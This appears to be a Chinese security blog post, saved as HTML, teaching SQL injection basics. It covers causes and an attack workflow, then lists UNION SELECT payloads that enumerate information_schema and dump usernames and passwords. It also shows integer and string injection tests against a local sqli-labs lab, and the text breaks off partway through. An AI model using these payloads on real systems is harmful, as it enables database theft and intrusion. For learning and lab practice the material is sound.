@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="krismile" />
+
+
+
+<meta name="description" content="web基础—SQL注入What​      SQL注入是服务器端未严格校验客户端发送的数据，而导致服务端SQL语句被恶意修改并成功执行的行为。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web基础---SQL注入">
+<meta property="og:url" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="KrismileBlog">
+<meta property="og:description" content="web基础—SQL注入What​      SQL注入是服务器端未严格校验客户端发送的数据，而导致服务端SQL语句被恶意修改并成功执行的行为。">
+<meta property="og:locale">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/1.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/2.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/3.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/4.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/5.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/6.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/7.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/8.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/9.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/10.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/11.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/12.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/13.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/14.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/15.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/16.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/17.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/18.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/19.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/20.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/21.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/22.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/23.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/24.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/25.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/26.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/27.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/28.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/29.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/30.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/31.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/32.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/58.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/33.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/34.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/35.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/36.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/37.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/38.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/40.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/41.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/42.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/43.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/44.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/45.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/46.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/47.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/48.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/49.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/50.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/51.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/52.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/53.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/54.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/55.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/56.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/57.png">
+<meta property="article:published_time" content="2021-08-14T12:28:34.000Z">
+<meta property="article:modified_time" content="2022-08-12T12:08:48.995Z">
+<meta property="article:author" content="krismile">
+<meta property="article:tag" content="web基础">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="KrismileBlog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/head.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>web基础---SQL注入 | KrismileBlog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/head.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/archives/">首页</a></li>
+                        
+                            <li><a href="/tags/">标签</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="/nichengxin1234@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ICS/" rel="tag">ICS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Phar反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E6%AF%94%E8%B5%9B/" rel="tag">ctf比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80%EF%BC%8CJWT/" rel="tag">web基础，JWT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%81SQL%E6%B3%A8%E5%85%A5%E3%80%81%E5%8F%8D%E5%BC%B9shell/" rel="tag">渗透测试、SQL注入、反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">哈哈哈</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/head.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">首页</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="/nichengxin1234@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+      <time datetime="2021-08-14T12:28:34.000Z" itemprop="datePublished">2021-08-14</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      web基础---SQL注入
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="web基础—SQL注入"><a href="#web基础—SQL注入" class="headerlink" title="web基础—SQL注入"></a>web基础—SQL注入</h2><h3 id="What"><a href="#What" class="headerlink" title="What"></a><strong>What</strong></h3><p>​      SQL注入是服务器端未严格校验客户端发送的数据，而导致服务端SQL语句被恶意修改并成功执行的行为。</p>
+<span id="more"></span>
+
+<h3 id="Why"><a href="#Why" class="headerlink" title="Why"></a><strong>Why</strong></h3><ul>
+<li>代码对带入SQL语句的参数过滤不严格</li>
+<li>未启用框架的安全配置，未使用框架安全的查询方法</li>
+<li>测试接口未删除</li>
+<li>未启用防火墙或未使用其他的安全防护设备</li>
+</ul>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a><strong>流程</strong></h3><ol>
+<li><p>判断是否有sql注入漏洞</p>
+<p>1）可控参数的改变能否影响页面显示结果</p>
+<p>2）输入的SQL语句能否报错–通过数据库报错，看到数据库的一些语句痕迹   </p>
+<p>3）输入的SQL语句能否不报错–能够成功闭合</p>
+</li>
+<li><p>判断操作系统，数据库，web应用类型</p>
+</li>
+<li><p>获取数据库信息（数据库—表—字段—值 ），包括管理员信息及拖库</p>
+</li>
+<li><p>加密信息破解，sqlmap可自动破解</p>
+</li>
+<li><p>提升权限，获得sql-shell,os-shell,登录应用后台</p>
+</li>
+</ol>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p> 攻击者利用SQL注入漏洞，可以获取数据库的多种信息（管理员的后台密码），从而获取数据库中的内容（脱库）。再特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限（mof或udf提权）。</p>
+<p><strong>基础SQL语句及MySQL数据库知识</strong></p>
+<p><strong>sql语句：</strong></p>
+<blockquote>
+<p>order by 4<br>判断有多少列<br>union select 1,2,3<br>判断数据显示点<br>union select 1,user(),database()­­<br>­显示出登录用户和数据库名<br>union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’ ),3<br>查看数据库有哪些表<br>union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name&#x3D;’users’ ),3<br>查看对应表有哪些列<br>union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3<br>查看账号密码信息</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/1.png"></p>
+<p>MySQL常用函数与参数：</p>
+<p>@  &#x3D;、&gt;、&gt;&#x3D;、&lt;&#x3D;、&lt;&gt;(不等于)         比较运算符</p>
+<p>@  and、or                                              逻辑运算符</p>
+<p>@  database()                                          当前数据库名</p>
+<p>@  length()                                               返回字符串的长度</p>
+<p>@  substring()                                          截取字符串的长度</p>
+<p>@  substr()                                                substr(截取的字符串，截取的起始位置，截取长度)                       </p>
+<p>@  left()                                                      从左侧开始取指定字符个数的字符串</p>
+<p>@  concat()                                                没有分隔符的连接字符串</p>
+<p>@  concat_ws()                                          含有分隔符的连接字符串</p>
+<p>@  group_concat()                                     连接一个组的字符串</p>
+<p>@  ascii()                                                      返回ASCII码</p>
+</blockquote>
+<p><strong>Mysql数据库：</strong></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/2.png" alt="2"></p>
+<p>对于mysql数据库（版本大于5.0）而言，mysql中存在一个Information_Schema数据库，这是mysql自带的数据库，它用来访问mysql数据库元数据（数据库名、表名、列名、数据类型，访问权限等）。</p>
+<blockquote>
+<p>其中， Information_Schema数据库中有三张表值得我们重点关注：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/3.png" alt="3"></p>
+<p>库名表：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/4.png" alt="4"></p>
+<p>表名表：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/5.png" alt="5"></p>
+<p>字段名表：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/6.png"></p>
+</blockquote>
+<p><strong>名称：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">information_schema.schemata    //总的数据库</span><br><span class="line">information_schema.schema      //数据库的库</span><br><span class="line">information_schema.tables      //数据表的库</span><br><span class="line">information_schema.columns     //数据结构的库</span><br><span class="line">table_schema                   //数据库</span><br><span class="line">table_name                     //数据表</span><br><span class="line">column_name                    //数据结构</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Classify"><a href="#Classify" class="headerlink" title="Classify"></a><strong>Classify</strong></h3><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/7.png" alt="7"></p>
+<h5 id="GET型注入与POST型注入的区别："><a href="#GET型注入与POST型注入的区别：" class="headerlink" title="GET型注入与POST型注入的区别："></a>GET型注入与POST型注入的区别：</h5><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>GET型注入</th>
+<th>POST型注入</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>url可见性</td>
+<td>参数url可见</td>
+<td>url参数不可见</td>
+</tr>
+<tr>
+<td>数据传输上</td>
+<td>通过拼接url进行传递参数</td>
+<td>通过body体传输参数</td>
+</tr>
+<tr>
+<td>安全性</td>
+<td>比POST更不安全</td>
+<td></td>
+</tr>
+<tr>
+<td>缓存性</td>
+<td>请求可以缓存</td>
+<td>请求不可以缓存</td>
+</tr>
+<tr>
+<td>后退页面</td>
+<td>请求页面后退时，不产生影响（只请求一次）</td>
+<td>会再次提交请求（请求两次，即burpsuite里点两次forward,网页显示结果）</td>
+</tr>
+<tr>
+<td>传输数据的大小</td>
+<td>一般不超过2k-4k</td>
+<td>根据php.ini配置文件设定，也可以无限大</td>
+</tr>
+<tr>
+<td>数据类型</td>
+<td>只接受ASCII字符</td>
+<td>没有限制</td>
+</tr>
+</tbody></table>
+<h4 id="回显型注入"><a href="#回显型注入" class="headerlink" title="回显型注入"></a>回显型注入</h4><h5 id="基于整型注入："><a href="#基于整型注入：" class="headerlink" title="基于整型注入："></a>基于整型注入：</h5><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号，URL：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-2/?id=1&#39;</a></p>
+<p>对应的sql：select * from table where id&#x3D;1’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
+<p>（2） 加and 1&#x3D;1 ,URL：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1and">http://127.0.0.1/sqli-labs-master/Less-2/?id=1and</a> 1&#x3D;1</p>
+<p>对应的sql：select * from table where id&#x3D;1 and 1&#x3D;1 语句执行正常，与原始页面如任何差异；</p>
+<p>（3） 加and 1&#x3D;2，URL：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1and">http://127.0.0.1/sqli-labs-master/Less-2/?id=1and</a> 1&#x3D;2</p>
+<p>对应的sql：select * from table where id&#x3D;1 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
+<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
+<p><strong>实验（sqli-labs&#x2F;less-2):</strong></p>
+<blockquote>
+<p>URL:<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a></p>
+</blockquote>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/8.png"></p>
+<p><strong>测试步骤：</strong></p>
+<ul>
+<li>加单引号：</li>
+</ul>
+<blockquote>
+<p>URL：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1%E2%80%99">http://127.0.0.1/sqli-labs-master/Less-2/?id=1’</a></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/9.png">由报错可以猜测此时的后台数据库SQL语句：</p>
+<p>select …from…where id&#x3D;1’ ；</p>
+</blockquote>
+<blockquote>
+<ul>
+<li>加and 1&#x3D;1 ,URL：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1and">http://127.0.0.1/sqli-labs-master/Less-2/?id=1and</a> 1&#x3D;1</li>
+</ul>
+<p>​       对应的sql：select * from table where id&#x3D;1 and 1&#x3D;1 语句执行正常，与原始页面如任何差异；</p>
+<ul>
+<li>加and 1&#x3D;2，URL：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1and">http://127.0.0.1/sqli-labs-master/Less-2/?id=1and</a> 1&#x3D;2</li>
+</ul>
+<p>​        对应的sql：select * from table where id&#x3D;1 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
+<p>存在整型注入。</p>
+<p>获取一些数据库信息：</p>
+<p>先判断字段数：用order by或者union select…</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/10.png" alt="10"></p>
+<p>接着数据库：</p>
+<p>当前数据库</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/11.png" alt="11"></p>
+<p>枚举数据库</p>
+</blockquote>
+<blockquote>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/12.png" alt="12"></p>
+<p>枚举表</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/13.png"></p>
+<p>枚举”users‘表的字段</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/14.png"></p>
+<p>枚举users字段username与password的值</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/15.png"></p>
+</blockquote>
+<h5 id="基于字符型注入："><a href="#基于字符型注入：" class="headerlink" title="基于字符型注入："></a>基于字符型注入：</h5><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<p>例如数字型语句：select * from table where id &#x3D;3</p>
+<p>则字符型如下：select * from table where name&#x3D;’admin’</p>
+<p>字符型注入有单引号，双引号，括号。此处为单引号举例，其他类似</p>
+<p><strong>测试步骤：</strong></p>
+<ul>
+<li>加单引号：</li>
+</ul>
+<blockquote>
+<p>select * from … where name&#x3D;’admin’ ‘;</p>
+<p>三个单引号，无法正常执行，会报错</p>
+</blockquote>
+<p>加 ‘ and 1&#x3D;1</p>
+<blockquote>
+<p>select * from… where name&#x3D;’admin’ and 1&#x3D;1’;</p>
+<p>以上语句也无法正常执行，需要注释符将后面的单引号注释掉</p>
+</blockquote>
+<p>加 ‘ and 1&#x3D;1#</p>
+<blockquote>
+<p>select * from… where name&#x3D;’admin’ and 1&#x3D;1#’;</p>
+<p>正常执行</p>
+</blockquote>
+<p>加 ‘ and 1&#x3D;2#</p>
+<blockquote>
+<p>select * from… where name&#x3D;’admin’ and 1&#x3D;2#’;</p>
+<p>and后面的1&#x3D;2为假，会报错</p>
+</blockquote>
+<p>因此存在字符型注入</p>
+<p><strong>实验（sqli-labs&#x2F;less-1）：</strong></p>
+<blockquote>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/16.png"></p>
+<p>可猜测为字符型注入</p>
+<p>然后按照上面的测试步骤进行进一步验证</p>
+<ul>
+<li>加 ‘ and 1&#x3D;1</li>
+</ul>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/17.png"></p>
+<ul>
+<li>加 ‘ and 1&#x3D;1#</li>
+</ul>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/18.png"></p>
+<ul>
+<li>加 ‘ and 1&#x3D;2#</li>
+</ul>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/19.png"></p>
+</blockquote>
+<p>获取相关数据库信息同整型注入语法</p>
+<h5 id="基于搜索型注入："><a href="#基于搜索型注入：" class="headerlink" title="基于搜索型注入："></a>基于搜索型注入：</h5><p>1）简介<br>一些网站为了方便用户查找网站的资源,都对用户提供了搜索的功能,因为是搜索功能,往往是程序员在编写代码时都忽略了对其变量(参数)的过滤,而且这样的漏洞在国内的系统中普遍的存在:</p>
